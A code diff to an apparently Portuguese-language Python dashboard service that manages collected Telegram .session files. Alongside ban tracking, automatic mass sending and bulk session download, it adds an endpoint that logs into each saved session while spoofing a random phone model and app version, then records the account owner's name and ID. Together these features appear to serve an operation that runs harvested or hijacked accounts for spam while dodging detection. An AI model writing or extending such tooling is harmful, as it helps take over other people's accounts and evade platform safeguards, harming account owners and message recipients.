@@ -112,6 +112,9 @@ def init_session_stats(phone, account_name="", account_id=None, collected_by=Non
             "ban_reason": "",
             "groups_count": 0,
             "contacts_count": 0,
+            "validation_status": "unknown",
+            "validated_at": None,
+            "validation_error": "",
         }
     else:
         session_stats[phone]["status"] = "active" if disparo_automatico_ativo() else "collected"
@@ -946,7 +949,10 @@ async def carregar_sessoes():
 # DASHBOARD API
 # ===============================
 async def serve_dashboard(request):
-    return web.FileResponse(os.path.join(BASE_DIR, "webapp", "dashboard.html"))
+    dashboard_path = os.path.join(BASE_DIR, "webapp", "dashboard.html")
+    if not os.path.exists(dashboard_path):
+        dashboard_path = os.path.join(BASE_DIR, "dashboard.html")
+    return web.FileResponse(dashboard_path)
 
 async def api_dashboard_logs(request):
     """Retorna os logs em tempo real"""
@@ -1003,6 +1009,9 @@ async def api_dashboard(request):
             "ban_reason": s.get("ban_reason", ""),
             "groups_count": s.get("groups_count", 0),
             "contacts_count": s.get("contacts_count", 0),
+            "validation_status": s.get("validation_status", "unknown"),
+            "validated_at": s.get("validated_at"),
+            "validation_error": s.get("validation_error", ""),
         })
 
     return web.json_response({
@@ -1016,6 +1025,120 @@ async def api_dashboard(request):
         "total_rounds": total_rounds,
         "sessions": sessions_list,
     })
+
+async def api_dashboard_validate_session(request):
+    """Valida uma sessão salva sem enviar mensagens nem interagir com contatos/grupos."""
+    token = request.query.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    data = await request.json()
+    phone = data.get("phone", "").strip()
+    if not phone:
+        return web.json_response({"error": "Telefone inválido"}, status=400)
+
+    session_path = os.path.join(SESSIONS_DIR, phone)
+    session_file = f"{session_path}.session"
+
+    if phone not in session_stats:
+        init_session_stats(phone)
+
+    if not os.path.exists(session_file):
+        session_stats[phone]["status"] = "expired"
+        session_stats[phone]["validation_status"] = "missing"
+        session_stats[phone]["validated_at"] = time.time()
+        session_stats[phone]["validation_error"] = "Arquivo .session não encontrado"
+        save_stats()
+        return web.json_response({
+            "ok": False,
+            "authorized": False,
+            "status": "expired",
+            "validation_status": "missing",
+            "error": "Arquivo .session não encontrado",
+        }, status=404)
+
+    devices = [
+        ("Samsung Galaxy S22", "Android 13", "10.9.5"),
+        ("iPhone 14 Pro", "iOS 17.0", "10.9.3"),
+        ("Xiaomi 13", "Android 13", "10.9.4"),
+    ]
+    device = random.choice(devices)
+    client = TelegramClient(
+        session_path,
+        API_ID,
+        API_HASH,
+        device_model=device[0],
+        system_version=device[1],
+        app_version=device[2],
+        lang_code="pt-br"
+    )
+
+    try:
+        print(f"[VALIDATE] Checando sessão {phone} sem enviar mensagens...")
+        await asyncio.wait_for(client.connect(), timeout=30)
+
+        authorized = await asyncio.wait_for(client.is_user_authorized(), timeout=20)
+        now = time.time()
+
+        if not authorized:
+            session_stats[phone]["status"] = "expired"
+            session_stats[phone]["validation_status"] = "invalid"
+            session_stats[phone]["validated_at"] = now
+            session_stats[phone]["validation_error"] = "Sessão não autorizada"
+            save_stats()
+            print(f"[VALIDATE] ❌ {phone} não está autorizada")
+            return web.json_response({
+                "ok": True,
+                "authorized": False,
+                "status": "expired",
+                "validation_status": "invalid",
+                "validated_at": now,
+                "error": "Sessão não autorizada",
+            })
+
+        me = await asyncio.wait_for(client.get_me(), timeout=20)
+        session_stats[phone]["status"] = "collected"
+        session_stats[phone]["account_name"] = me.first_name or ""
+        session_stats[phone]["account_id"] = me.id
+        session_stats[phone]["validation_status"] = "valid"
+        session_stats[phone]["validated_at"] = now
+        session_stats[phone]["validation_error"] = ""
+        save_stats()
+        print(f"[VALIDATE] ✅ {phone} autorizada como {me.first_name} (ID: {me.id})")
+        return web.json_response({
+            "ok": True,
+            "authorized": True,
+            "status": "collected",
+            "validation_status": "valid",
+            "validated_at": now,
+            "account_name": me.first_name or "",
+            "account_id": me.id,
+        })
+
+    except Exception as e:
+        error_name = type(e).__name__
+        now = time.time()
+        invalid_errors = ["UserDeactivated", "AuthKeyUnregistered", "AuthKeyDuplicated"]
+        session_stats[phone]["validation_status"] = "invalid" if any(x in error_name for x in invalid_errors) else "error"
+        session_stats[phone]["validated_at"] = now
+        session_stats[phone]["validation_error"] = f"{error_name}: {e}"
+        if session_stats[phone]["validation_status"] == "invalid":
+            session_stats[phone]["status"] = "expired"
+        save_stats()
+        print(f"[VALIDATE] ⚠️ Erro ao validar {phone}: {error_name}: {e}")
+        return web.json_response({
+            "ok": False,
+            "authorized": False,
+            "validation_status": session_stats[phone]["validation_status"],
+            "validated_at": now,
+            "error": f"{error_name}: {e}",
+        }, status=500)
+
+    finally:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
 async def api_dashboard_cleanup(request):
     """Remove sessões BANIDAS dos stats e deleta arquivos .session"""
@@ -1171,6 +1294,7 @@ async def main():
     web_app.router.add_get("/api/dashboard", api_dashboard)
     web_app.router.add_get("/api/dashboard/logs", api_dashboard_logs)
     web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)
+    web_app.router.add_post("/api/dashboard/validate-session", api_dashboard_validate_session)
     web_app.router.add_get("/api/dashboard/download-sessions", api_dashboard_download_sessions)
     web_app.router.add_post("/api/dashboard/connect-bot", api_connect_bot)
     web_app.router.add_post("/api/dashboard/disconnect-bot", api_disconnect_bot)
